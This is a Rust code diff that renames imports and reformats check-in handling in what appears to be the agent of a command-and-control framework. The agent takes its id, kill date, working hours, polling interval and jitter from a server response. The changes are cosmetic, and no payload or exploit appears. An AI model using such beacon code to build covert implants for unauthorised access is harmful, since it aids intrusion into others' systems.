@@ -1,20 +1,17 @@
 use alloc::sync::Arc;
 use core::ffi::c_void;
+
+use kageshirei_communication_protocol::{
+    communication_structs::checkin::CheckinResponse,
+    protocol::Protocol,
+    sender::Sender,
+};
+use kageshirei_crypt::encryption_algorithm::ident_algorithm::IdentEncryptor;
+use kageshirei_runtime::Runtime;
 use libc_print::libc_eprintln;
-use rs2_communication_protocol::communication_structs::checkin::CheckinResponse;
-
-use rs2_runtime::Runtime;
-
 use mod_agentcore::{instance, instance_mut};
-
-use rs2_communication_protocol::protocol::Protocol;
-use rs2_communication_protocol::sender::Sender;
-
-use rs2_crypt::encryption_algorithm::ident_algorithm::IdentEncryptor;
-
 #[cfg(feature = "protocol-json")]
 use mod_protocol_json::protocol::JsonProtocol;
-
 #[cfg(feature = "protocol-winhttp")]
 use mod_protocol_winhttp::protocol::WinHttpProtocol;
 
@@ -66,22 +63,24 @@ where
                         instance_mut().config.id = checkin_response_data.id;
                         instance_mut().config.kill_date = checkin_response_data.kill_date;
                         instance_mut().config.working_hours = checkin_response_data.working_hours;
-                        instance_mut().config.polling_interval =
-                            checkin_response_data.polling_interval;
+                        instance_mut().config.polling_interval = checkin_response_data.polling_interval;
                         instance_mut().config.polling_jitter = checkin_response_data.polling_jitter;
 
                         // If successful, mark the session as connected
                         instance_mut().session.connected = true;
-                    } else {
+                    }
+                    else {
                         libc_eprintln!(
                             "Checkin Response Error: {}",
                             checkin_response.err().unwrap()
                         );
                     }
-                } else {
+                }
+                else {
                     libc_eprintln!("Error: {}", result.err().unwrap());
                 }
-            } else {
+            }
+            else {
                 // Handle error if Checkin data is null (currently commented out)
                 libc_eprintln!("Error: Checkin data is null");
             }
@@ -128,22 +127,24 @@ where
                         instance_mut().config.id = checkin_response_data.id;
                         instance_mut().config.kill_date = checkin_response_data.kill_date;
                         instance_mut().config.working_hours = checkin_response_data.working_hours;
-                        instance_mut().config.polling_interval =
-                            checkin_response_data.polling_interval;
+                        instance_mut().config.polling_interval = checkin_response_data.polling_interval;
                         instance_mut().config.polling_jitter = checkin_response_data.polling_jitter;
 
                         // If successful, mark the session as connected
                         instance_mut().session.connected = true;
-                    } else {
+                    }
+                    else {
                         libc_eprintln!(
                             "Checkin Response Error: {}",
                             checkin_response.err().unwrap()
                         );
                     }
-                } else {
+                }
+                else {
                     libc_eprintln!("Error: {}", result.err().unwrap());
                 }
-            } else {
+            }
+            else {
                 // Handle error if Checkin data is null (currently commented out)
                 libc_eprintln!("Error: Checkin data is null");
             }
@@ -164,6 +165,4 @@ pub unsafe fn protocol_from_raw(ptr: *mut c_void) -> &'static mut WinHttpProtoco
 }
 
 /// Function to retrieve a mutable reference to a IdentEncryptor struct from a raw pointer.
-pub unsafe fn encryptor_from_raw(ptr: *mut c_void) -> &'static mut IdentEncryptor {
-    &mut *(ptr as *mut IdentEncryptor)
-}
+pub unsafe fn encryptor_from_raw(ptr: *mut c_void) -> &'static mut IdentEncryptor { &mut *(ptr as *mut IdentEncryptor) }
